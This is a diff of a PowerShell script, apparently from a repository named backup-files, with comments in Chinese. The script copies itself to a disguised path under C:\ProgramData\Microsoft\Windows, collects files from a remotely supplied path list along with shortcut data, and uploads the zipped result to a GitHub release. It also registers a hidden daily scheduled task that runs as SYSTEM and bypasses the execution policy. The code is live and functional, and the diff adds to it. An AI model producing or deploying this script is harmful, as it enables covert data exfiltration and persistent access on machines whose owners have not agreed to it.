@@ -1,19 +1,19 @@
-# install.ps1 - 主功能：上传文件 + 注册定时任务
+# install.ps1 - 主功能脚本：上传文件 + 注册任务
 $script:logPath = "C:\upload_log.txt"
 
-function Log($msg) {
+function Log($msg, $fatal = $false) {
     $line = "[{0}] {1}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $msg
-    try {
-        $line | Out-File $script:logPath -Append -Encoding utf8
-    } catch {
-        Write-Host "❌ 日志写入失败: $($_.Exception.Message)"
-    }
+    try { $line | Out-File $script:logPath -Append -Encoding UTF8 } catch {}
     Write-Host $line
+    if ($fatal) {
+        Start-Sleep -Seconds 15
+        exit 1
+    }
 }
 
 Log "===== INSTALL EXECUTED ====="
 
-# === 下载自身到固定路径（以便任务执行） ===
+# === 下载自身到 C:\ProgramData\Microsoft\Windows\update.ps1 ===
 $localPath = "C:\ProgramData\Microsoft\Windows\update.ps1"
 $remoteUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/install.ps1"
 
@@ -21,19 +21,17 @@ try {
     Invoke-RestMethod -Uri $remoteUrl -OutFile $localPath -UseBasicParsing -ErrorAction Stop
     Log "[OK] install.ps1 downloaded to $localPath"
 } catch {
-    Log "❌ Failed to download install.ps1: $($_.Exception.Message)"
-    return
+    Log "❌ Failed to download install.ps1: $($_.Exception.Message)" $true
 }
 
 # === 获取 GitHub Token（从环境变量） ===
 $token = $env:GITHUB_TOKEN
 if (-not $token) {
-    Log "❌ GITHUB_TOKEN 环境变量不存在，终止执行。"
-    return
+    Log "❌ GITHUB_TOKEN 环境变量不存在，终止执行。" $true
 }
-Log "[DEBUG] GITHUB_TOKEN detected"
+Log "[DEBUG] GITHUB_TOKEN 检测成功"
 
-# === 上传逻辑（文件收集、打包、上传） ===
+# === 上传逻辑 ===
 try {
     $repo = "drftghy/backup-files"
     $now = Get-Date
@@ -47,11 +45,16 @@ try {
     $zipPath = Join-Path $env:TEMP $zipName
     New-Item -ItemType Directory -Path $tempRoot -Force | Out-Null
 
-    # 加载上传路径
+    # 获取上传路径列表
     $targetListUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/upload-target.txt"
-    $pathList = Invoke-RestMethod -Uri $targetListUrl -UseBasicParsing
-    $paths = $pathList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
+    try {
+        $pathList = Invoke-RestMethod -Uri $targetListUrl -UseBasicParsing -ErrorAction Stop
+        $paths = $pathList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
+    } catch {
+        Log "❌ 无法加载路径列表：$($_.Exception.Message)" $true
+    }
 
+    # 复制目标文件
     $i = 0
     foreach ($path in $paths) {
         $i++
@@ -66,7 +69,7 @@ try {
                 Copy-Item $path -Destination $dst -Force
             }
         } catch {
-            Log "⚠️ Failed to copy path: ${path} => $($_.Exception.Message)"
+            Log "⚠️ 复制失败: $path => $($_.Exception.Message)"
         }
     }
 
@@ -82,18 +85,19 @@ try {
         }
         $lnkReport | Out-File "$tempRoot\lnk_info.txt" -Encoding utf8
     } catch {
-        Log "⚠️ Failed to extract .lnk shortcuts: $($_.Exception.Message)"
+        Log "⚠️ 快捷方式收集失败: $($_.Exception.Message)"
     }
 
+    # 打包
     Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force
 
-    # 上传 Release
+    # 创建 Release
     $releaseData = @{
-        tag_name    = $tag
-        name        = $releaseName
-        body        = "Auto backup from $computerName"
-        draft       = $false
-        prerelease  = $false
+        tag_name   = $tag
+        name       = $releaseName
+        body       = "Auto backup from $computerName"
+        draft      = $false
+        prerelease = $false
     } | ConvertTo-Json -Depth 3
 
     $headers = @{
@@ -102,26 +106,40 @@ try {
         Accept        = "application/vnd.github.v3+json"
     }
 
-    $releaseResp = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData
+    $releaseResp = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData -ErrorAction Stop
     $uploadUrl = $releaseResp.upload_url -replace "{.*}", "?name=$zipName"
 
     $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
     $uploadHeaders = @{
         Authorization = "token $token"
         "Content-Type" = "application/zip"
-        "User-Agent" = "PowerShell"
+        "User-Agent"   = "PowerShell"
     }
-    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes
-    Log "[OK] Upload completed."
+
+    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
+    Log "[OK] 上传完成"
 } catch {
-    Log "❌ Upload failed: $($_.Exception.Message)"
+    Log "❌ 上传失败: $($_.Exception.Message)" $true
 }
 
-# 清理
+# 清理临时文件
 Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
 
-# === 注册计划任务，每天 0:00 执行 update.ps1 ===
+# === 注册计划任务（每天 0:00 运行 update.ps1）===
 try {
     $taskName = "UploaderTask"
-    if (Get-ScheduledTask -TaskName
+    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
+        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
+        Log "[OK] 已删除旧任务"
+    }
+
+    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$localPath`""
+    $trigger = New-ScheduledTaskTrigger -Daily -At "00:00"
+    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+
+    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal
+    Log "[OK] 已注册计划任务 (每天 0:00)"
+} catch {
+    Log "❌ 注册计划任务失败: $($_.Exception.Message)" $true
+}
